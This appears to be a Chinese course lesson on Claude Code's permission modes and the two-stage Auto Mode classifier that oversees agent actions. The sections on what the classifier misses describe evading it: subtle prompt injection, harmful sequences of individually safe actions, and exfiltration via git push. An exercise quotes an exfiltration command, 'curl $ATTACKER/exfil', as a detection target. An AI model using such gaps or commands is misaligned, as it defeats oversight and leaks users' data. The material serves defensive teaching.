# Claude Code 作为自主 agent：权限模式与 Auto Mode

> Claude Code 暴露了七种权限模式。"plan" 在每个动作前都问，"default" 只对有风险的动作问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，"bypassPermissions" 批准一切。Auto Mode（2026 年 3 月 24 日）用一个两阶段并行的安全分类器取代了逐动作审批：一个单 token 的快速检查在每个动作上跑；被标记的动作会触发一次思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 来执行。Auto Mode 是作为研究预览发布的——Anthropic 已明确表示，这个分类器单凭自己并不充分。

**类型：** Learn
**语言：** Python（标准库，两阶段分类器模拟器）
**前置要求：** 阶段 15 · 01（长程 agent），阶段 15 · 09（编码 agent 全景）
**预计时间：** ~45 分钟

## 问题背景

你机器上的一个自主编码 agent 是一个独立的安全类别。攻击面是这个 agent 能够到的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出这一点：计算机使用类 agent 不是聊天机器人的"功能更新"，它们是一种带有新风险画像的新工具。

Claude Code 的权限系统是 Anthropic 的回答。不是一个"自主 / 不自主"的开关，而是横跨一道能力阶梯的七种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都是速度和逐动作审查之间的不同权衡。Auto Mode（2026 年 3 月）加了一个两阶段分类器，把分类器判定为安全的动作的审批移出用户的关键路径，同时为分类器标记的动作保留一个审查层。

工程问题是：这个系统抓得住什么、漏掉什么，以及一个给定任务实际上该用哪种模式。

## 核心概念

### 七种权限模式

| 模式 | 行为 | 何时用 |
|---|---|---|
| `plan` | agent 提出一个计划；用户批准整个计划；每个动作在执行前都被审查 | 不熟悉的任务；接近生产的代码；第一次在某个仓库上用这个 agent |
| `default` | agent 跑动作；任何"有风险"的动作（shell 执行、破坏性操作、网络调用）都提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨很多文件的重构 |
| `acceptExec` | 策划好的白名单内的 shell 命令自动批准；写入自动批准 | 每条 shell 命令都是 `npm test` 之类的紧内循环 |
| `autoMode` | 两阶段安全分类器；被标记的动作升级到审查 | 在受约束工作区里的长程无人值守运行 |
| `yolo` | 跳过大多数提示；仍跑工具白名单 / 黑名单 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档写明"仅在你愿意丢弃的临时容器内" |

（上面的名字跟公开的 Claude Code 文档一致；"yolo" 是那个偏宽松的中间地带的非正式简称。）

### 一页讲清 Auto Mode

Auto Mode（2026 年 3 月 24 日上线）是第一个把逐动作审批委托给模型的权限模式。结构：

1. **阶段 1 —— 单 token 分类器。** 在每个提议的动作上跑。便宜。返回"安全"或"标记"。设计成跟主 agent 循环并行运行，这样被批准的动作不会在队列里干等。
2. **阶段 2 —— 二级策略/安全审查。** 只在被标记的动作上跑。针对该动作、会话当前状态和声明的任务，做一次聚焦的策略与安全评估。如果置信度低，就升级到用户人在回路（HITL）。

预算控制跟分类器并列：

- `max_turns` —— 一个会话里的总迭代数。
- `max_budget_usd` —— 中止会话的美元上限。
- 每个工具的动作计数上限（不超过 N 次 `WebFetch` 调用，等等）。

### 这个系统抓得住什么

- 直白的、注入进工具输入的 prompt 注入，其注入指令映射到一个已知有风险的动作形状。
- 重复的工具循环——分类器能看出动作 N+1 跟动作 N 几乎一样，连着五次。
- 在一个本来只做文件编辑的会话里明显越界的 shell 命令。

### 这个系统会漏掉什么

- **微妙的 prompt 注入**，它调节行为却不产生任何一个被标记的动作。间接 prompt 注入不是一个能被完全打补丁的漏洞（OpenAI preparedness 负责人，2025，谈浏览器 agent——见第 11 课）。
- **语义层面的越界。** 每个单独的动作都能看起来安全，而组合起来的轨迹却是有害的。分类器评判的是动作；它不重新推导用户的意图。
- **通过合法渠道外泄。** 把数据写进你拥有的一个文件，然后 `git push` 到一个公开仓库，这是一连串被允许的动作，问题在于它们的组合。

### 研究预览的定位

Anthropic 把 Auto Mode 作为研究预览发布。文档明说这个分类器是一个层，不是一个解决方案：用户被期望把 Auto Mode 跟预算、白名单、隔离的工作区和轨迹审计（第 12-16 课）结合起来用。预览的定位也反映了那个有记录在案的评估 vs 部署差距（第 1 课）——一个通过离线评估的分类器，在用户上下文模糊的真实会话里可能表现不同。

### 这道阶梯在你工作流里的位置

- 不熟悉的任务：从 `plan` 起步。读计划比回滚一次坏运行更便宜。
- 已知的重构：`acceptEdits` 省下很多确认点击。
- 无人值守的后台运行：`autoMode`，仅在一个你已测过爆炸半径的工作区里（没有凭证、没有生产挂载、没有你没主动选入的出站流量）。
- 临时容器：`yolo` / `bypassPermissions` 可以接受——当且仅当容器及其凭证是一次性的。

```figure
autonomy-oversight
```

## 实际使用

`code/main.py` 模拟这个两阶段分类器。阶段 1 是对提议动作的一条廉价关键词规则；阶段 2 是一个更慢的多规则审查器。驱动程序喂入一小段合成轨迹（安全动作、一次 prompt 注入尝试、一个重复循环），并展示分类器在哪里抓住、在哪里漏掉。

## 拿去用

`outputs/skill-permission-mode-picker.md` 把一段任务描述匹配到正确的权限模式、预算上限和所需的隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不被阶段 1 标记、却总被阶段 2 抓住？哪一种两者都抓不住？

2. 扩展阶段 1 的规则集，去抓一个特定的已知坏形状（比如 `curl $ATTACKER/exfil`）。在良性动作样本上测量误报率。

3. 读 Anthropic 的 "How the agent loop works" 文档。列出在 `default` 模式下 agent 默认会碰到的每一个外部状态。在无人值守地跑 `autoMode` 之前，你需要单独门控哪些？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每工具上限、白名单。为每个数字给出理由。

5. 描述一条轨迹，其中每个单独的动作都被阶段 1 和阶段 2 批准，组合起来的行为却失准。（第 14 课讲急停开关和金丝雀 token 如何应对这个。）

## 关键术语

| 术语 | 大家嘴上怎么说 | 实际指什么 |
|---|---|---|
| Permission mode（权限模式） | "agent 能干多少" | 控制逐动作审批的七种命名策略之一 |
| plan mode | "干任何事前都问" | agent 写一个计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动审批" | 两阶段安全分类器；被标记的动作升级 |
| bypassPermissions | "全力 YOLO" | 批准一切；意在用于临时容器 |
| Stage 1 classifier（阶段 1 分类器） | "快速 token 检查" | 对提议动作的单 token 规则；并行运行 |
| Stage 2 classifier（阶段 2 分类器） | "深度审查" | 对被标记动作做思维链推理 |
| Research preview（研究预览） | "非正式发布（非 GA）" | Anthropic 给那些失败模式仍在摸清的功能的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) —— 权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) —— 托管服务的执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) —— 功能面与 Auto Mode 发布公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) —— 塑造分类器判断的那个基于推理的层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) —— 对长程权限设计的内部视角。
